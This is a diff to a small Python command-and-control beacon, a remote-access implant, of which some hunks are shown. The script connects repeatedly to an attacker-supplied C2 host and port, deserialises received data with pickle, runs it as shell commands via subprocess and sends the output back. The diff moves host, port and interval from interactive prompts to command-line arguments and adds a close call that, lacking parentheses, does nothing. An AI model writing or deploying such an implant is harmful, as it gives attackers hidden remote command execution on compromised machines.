@@ -1,27 +1,30 @@
 #!/usr/bin/python3
 
 # Standard libraries only
+import sys
 import socket
 import subprocess
 import time
 import pickle
 
-# Initialize variables from user input
-rhost = str(input("C2 IP Address: " ))
-rport = int(input("C2 Port: "))
-wait = int(input("Beacon interval in seconds: "))
-rserver = (rhost, rport)
+
+# Display script usage if not given correct number of arguments.
+if len(sys.argv) != 4:
+    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
+    sys.exit(1)
+
+# Initialize global variables.
+rhost, rport, wait = sys.argv[1:4]
+wait = int(wait)
+rserver = (rhost, int(rport))
+
 
 def phone_home():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# Attempt to connect and if the C2 server isn't up display a message and return from the function.
     try:
         s.connect(rserver)
     except socket.error:
         print("Dad isn't home")
-
-# Receive any queued commands if the server is up, run them, then send back the stdout & stderr
     else:
         data = s.recv(1024)
         cmd = pickle.loads(data)
@@ -34,6 +37,8 @@ def phone_home():
             else:
                 cmd_return = (str(c) + "\n" + str(execute.stdout))
                 s.sendall(bytes(cmd_return, "utf-8"))
+    s.close
+    return
 
 # Run the function forever.
 while True:
